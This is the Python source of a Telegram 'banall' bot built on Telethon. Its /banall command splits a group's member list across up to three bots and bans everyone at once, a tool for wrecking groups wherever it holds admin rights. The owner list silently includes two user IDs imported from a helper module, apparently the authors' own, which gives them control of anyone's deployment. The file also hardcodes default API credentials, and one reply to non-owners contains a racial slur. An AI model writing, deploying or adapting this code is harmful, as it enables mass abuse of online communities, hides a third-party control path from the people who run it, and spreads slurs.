# Powered by @ALONE_WAS_BOT | @ShiningOff
# Dear Pero ppls Plish Don't remove this line from here🌚
# created by ItsmeHyper13
import logging
import os
import sys, platform
import asyncio
from os import getenv
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import LeaveChannelRequest, EditBannedRequest
from telethon.tl.types import ChatBannedRights
from telethon import __version__ as tel
from str import dad as gg, dady as g, startxt2, startxt, hlptxt
from datetime import datetime

# Logging Setup
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

# API & Tokens Config
API_ID = int(getenv("API_ID", "4110592"))
API_HASH = getenv("API_HASH", "aa7c849566922168031b95212860ede0")
BOT_TOKEN = getenv("BOT_TOKEN", None)
BOT_TOKEN_2 = getenv("BOT_TOKEN_2", None) 
BOT_TOKEN_3 = getenv("BOT_TOKEN_3", None) # 3rd Bot Token
OWNER_ID = getenv("OWNER_ID", None)
OP  = [int(g), int(gg), int(OWNER_ID)] if OWNER_ID else [int(g), int(gg)]

# Triple Clients Setup
bot1 = TelegramClient("Bot1", api_id=API_ID, api_hash=API_HASH)
bot2 = TelegramClient("Bot2", api_id=API_ID, api_hash=API_HASH)
bot3 = TelegramClient("Bot3", api_id=API_ID, api_hash=API_HASH)

Owner = "https://t.me/ALONE_WAS_BOT"
repo = "https://github.com/TeamAloneOp/AloneXBanallBot/fork"

@bot1.on(events.NewMessage(pattern="^/start"))
async def start(event):
    if event.is_group:
        try: await event.delete()
        except: pass
        
    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/MUSIC_BOT_WORLD"), Button.url("••ʀєρο••", f'{repo}')]
    py = platform.python_version()
    
    if event.sender.id in OP:
        await bot1.send_file(
            event.sender_id,
            file="https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
            caption=startxt.format(event.sender.first_name, event.sender.id, py, tel, Owner),
            link_preview=False,
            buttons=buttns
        )
    else:
        await bot1.send_file(
            event.sender_id,
            file="https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
            caption=startxt2.format(event.sender.first_name, event.sender.id, py, tel, Owner),
            link_preview=False,
            buttons=buttns
        )

@bot1.on(events.NewMessage(pattern="^/help"))
async def help_cmd(event):
    if event.is_group:
        try: await event.delete()
        except: pass
        
    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/MUSIC_BOT_WORLD"), Button.url("••ʀєρο••", f'{repo}')]
    if event.sender.id in OP:
        await bot1.send_file(
            event.sender_id,
            file="https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
            caption=hlptxt.format(event.sender.first_name, event.sender.id),
            link_preview=False,
            buttons=buttns
        )
    else:
        await bot1.send_message(event.sender_id, "Huh Nigga!\nThis is not for you lol 😑\n\nMake your own bot from this [Repository⚡](https://github.com/denki307/banallx)", link_preview=False)       

@bot1.on(events.NewMessage(pattern="^/ping"))
async def ping(event):
    if event.is_group:
        try: await event.delete()
        except: pass
        
    if event.sender.id in OP:
        start = datetime.now()
        txxt = await bot1.send_message(event.sender_id, "Pinging...")
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await txxt.edit(f"γєαн ι αм αℓιϐє 🔥!!\n\nριиg ροиg 🏓\n   ➥ `{ms} ms`")

async def ban_task(client, users, chat_id, boss_id):
    for user in users:
        if user.id == boss_id:
            continue
        try:
            await client(EditBannedRequest(chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
        except Exception as e:
            print(f"Error banning {user.id} via {client.session.filename}: {e}")
        await asyncio.sleep(0.3)

@bot1.on(events.NewMessage(pattern="^/banall"))
async def bun(event):
    if event.sender.id in OP:
        if not event.is_group:
            await bot1.send_message(event.sender_id, "__Brush Are You Serious 🙄.\nUse This Command In Any Group!!__")
            return
        
        try: await event.delete()
        except: pass
        
        cht = await event.get_chat()
        if not cht.admin_rights and not cht.creator:
            await bot1.send_message(event.sender_id, f"__I Don't Have Sufficient Rights To Do This in {cht.title}.__")
            return
            
        everyone = await bot1.get_participants(event.chat_id)
        bot1_me = await bot1.get_me()
        
        active_bots = [(bot1, bot1_me)]
        
        # Checking Bot 2
        if BOT_TOKEN_2:
            try:
                bot2_me = await bot2.get_me()
                await bot2.get_participants(event.chat_id)
                active_bots.append((bot2, bot2_me))
            except Exception as e:
                await bot1.send_message(event.sender_id, f"⚠️ **Bot 2 Error:** `{e}`")
                
        # Checking Bot 3
        if BOT_TOKEN_3:
            try:
                bot3_me = await bot3.get_me()
                await bot3.get_participants(event.chat_id)
                active_bots.append((bot3, bot3_me))
            except Exception as e:
                await bot1.send_message(event.sender_id, f"⚠️ **Bot 3 Error:** `{e}`")

        num_bots = len(active_bots)
        await bot1.send_message(event.sender_id, f"__Ye Bilek Migic Begins with {num_bots} Bots in {cht.title} 🥳...__")
        
        # Split list dynamically based on active bots
        chunk_size = len(everyone) // num_bots
        tasks = []
        
        for i in range(num_bots):
            client, me_user = active_bots[i]
            start_idx = i * chunk_size
            end_idx = (i + 1) * chunk_size if i < num_bots - 1 else len(everyone)
            chunk = everyone[start_idx:end_idx]
            tasks.append(ban_task(client, chunk, event.chat_id, me_user.id))
            print(f"{client.session.filename} processing {len(chunk)} members...")
            
        await asyncio.gather(*tasks)
        await bot1.send_message(event.sender_id, f"**Ban Completed in {cht.title} using {num_bots} Bots!** ✅")

@bot1.on(events.NewMessage(pattern="^/restart"))
async def restart(jnl):
    if jnl.is_group:
        try: await jnl.delete()
        except: pass
        
    if jnl.sender.id in OP:
        await bot1.send_message(jnl.sender_id, "__Wait Restarting...__")
        try:
            await bot1.disconnect()
            if BOT_TOKEN_2: await bot2.disconnect()
            if BOT_TOKEN_3: await bot3.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()

@bot1.on(events.NewMessage(pattern="^/leave"))
async def leave(z):
    if z.is_group:
        try: await z.delete()
        except: pass
        
    if z.sender.id in OP:
        mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(z.text) > 7:
            mkb = int(mkc[0])
            hm = await bot1.send_message(z.sender_id, "__Wait Leaving...__")
            try:
                await bot1(LeaveChannelRequest(mkb))
                await hm.edit("**Bot 1 Succesfully Lefted!!**")
            except Exception as e:
                await hm.edit(str(e))
        else:
            mkb = z.chat_id
            ok = await bot1.send_message(z.sender_id, "__Wait Leaving...__")
            try:
                await bot1(LeaveChannelRequest(mkb))
                if BOT_TOKEN_2: await bot2(LeaveChannelRequest(mkb))
                if BOT_TOKEN_3: await bot3(LeaveChannelRequest(mkb))
                await ok.edit("**All Active Bots Succesfully Lefted!!**")
            except Exception as e:
                await ok.edit(str(e))

# Running all bots
bot1.start(bot_token=BOT_TOKEN)
if BOT_TOKEN_2: bot2.start(bot_token=BOT_TOKEN_2)
if BOT_TOKEN_3: bot3.start(bot_token=BOT_TOKEN_3)

print(f"Bots Deployed Successfully ✅")
print("Join @AlonesHeaven if you facing any kind of issue!!")

asyncio.get_event_loop().run_forever()
